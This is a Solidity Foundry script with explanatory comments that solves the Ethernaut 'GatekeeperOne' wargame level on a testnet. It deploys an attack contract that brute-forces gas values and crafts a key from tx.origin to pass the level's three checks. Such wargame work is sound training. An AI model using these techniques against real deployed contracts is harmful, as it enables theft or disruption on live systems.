// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/GatekeeperOne.s.sol --tc GatekeeperOneSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract GatekeeperOneSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("GATEKEEPERONE_INSTANCE"));

    /*
        - The gateOne can be passing by sending the transaction from a contract address like in the telephone level
        - The gateTwo can be passing by having the gasleft() % 8191 == 0. Notice that the gateOne will consume some gas that we need to calculate
            we can use the console.log to print the gasleft() value and calculate the gas consumed by the gateOne in the GatekeeperOne contract
        - The gateThree:
            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
            require(uint32(uint64(_gateKey)) != uint64(_gateKey)
            require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

            Notice key is 8 bytes
            when we cast a higher to a lower value it means that the left part is cut out
            So uint16 key = uint32 ⇒ uint16
            uint32 ≠ uint64 ⇒ this is easly done by choosing two numbers
            The right most 2 bytes of the address need to be equal the the right most 4 bytes of the key
            so taking this address as an example
            0xCb279cc9B3F66D0fe8c1F44A44e1cF51414fC738 
            C738 is the 2 bytes that need to be equal
            the key will have as the 2 less significant bytes as
            0000C738
            this also fit the first condition
            For the second condition
            the 8 bytes key should be different than the 4 bytes representation
            so we can put anything as the other 4 most significant bytes to pass this while it is different than 0
            for example 10000000 0000C738
    */


    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create the middle contract
        GatekeeperOneAttackContract attackContract = new GatekeeperOneAttackContract();
        // call the enter function of the middle contract with the gateKey
        attackContract.enter(instance);

        console.log("Entrant: ", GatekeeperOne(instance).entrant());

        vm.stopBroadcast();
    }

}

contract GatekeeperOneAttackContract {

    // We keep the last 2 bytes cast it to 4 bytes and then add a number that make the 4 bytes in the front not equal to 0 (1_00_00_00_00) 
    bytes8 key = bytes8(uint64((uint16(uint160(msg.sender)))) + 0x100000000);

    function enter(address gatekeeperOneInstance) public {
        // brute force the gateTwo by trying different gas values (Notice that 300 is a estimated value of gas consumed by gateOne)
        for(uint256 i = 300; i >= 0; i--) {
            (bool success, ) = gatekeeperOneInstance.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                console.log("Gas consumed by gateOne: ", i);
                break;
            }
        }
    }

}